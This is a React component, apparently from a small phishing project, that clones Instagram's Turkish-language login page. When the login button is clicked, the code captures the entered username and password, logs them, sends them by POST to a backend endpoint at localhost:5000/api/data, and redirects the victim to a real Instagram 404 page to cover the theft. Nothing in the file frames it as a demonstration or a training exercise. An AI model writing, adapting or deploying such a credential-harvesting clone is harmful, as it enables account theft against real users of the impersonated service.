import './App.css'
import { useState } from 'react'
import axios from 'axios';

function App() {
  const [password, setPassword] = useState('');
  const [userName, setUserName] = useState('');
  const handleClick = async () => {
    console.log("User Name: ", userName)
    console.log("Password:", password)
    window.location.href = 'https://www.instagram.com/404/';

    try {
        // Send POST request to backend
        await axios.post('http://localhost:5000/api/data', { data: {userName, password} });
        console.log('Data sent to backend');
      } catch (error) {
        console.error('Error sending data:', error);
      }
  }

  return (
    <>
     <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
    <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
        <h1 className="bg-no-repeat instagram-logo"></h1>
        <div className="mt-8 w-64 flex flex-col">
            <input autoFocus
                  value={userName} 
                  onChange={(e) => setUserName(e.target.value)} 
                   className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 p-3 focus:outline-none focus:border-gray-400 active:outline-none"
                   id="email" placeholder="Telefon numarası, kullanıcı adı veya e-posta" type="text"/>
            <input autoFocus
                  value={password} 
                  onChange={(e) => setPassword(e.target.value)} 
                   className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 p-3 focus:outline-none focus:border-gray-400 active:outline-none"
                   id="password" placeholder="Şifre" type="password"/>
            <button
            onClick={handleClick} 
            className=" text-sm text-center bg-[#4CB5F9] text-white py-2 rounded-lg font-medium">
                Giriş yap
            </button>
        </div>
        <div className="flex justify-evenly space-x-2 w-64 mt-4">
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">ya da</span>
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
        </div>
        <button className="mt-4 flex pb-2 pt-4 items-center">
            <div className="bg-no-repeat facebook-logo mr-1"></div>
            <span className="text-s  text-blue-900 font-semibold">Facebook ile Giriş Yap</span>
        </button>
        <a className="text-xs text-blue-900 mt-4 cursor-pointer mb-1" href='https://www.instagram.com/accounts/password/reset/'>Şifreni mi unuttun?</a>
    </div>
    <div className="bg-white border border-gray-300 text-center w-80 py-4">
        <span className="text-sm">Hesabın yok mu?</span>
        <a className="text-blue-500 text-sm font-semibold" href='https://www.instagram.com/accounts/emailsignup/'>Kaydol</a>
    </div>
    <div className="mt-3 text-center">
        <span className="text-xs">Uygulamayı indir.</span>
        <div className="flex mt-3 space-x-2">
            <div className="bg-no-repeat apple-store-logo"></div>
            <div className="bg-no-repeat google-store-logo"></div>
        </div>
    </div>
</div>
    </>
  )
}

export default App
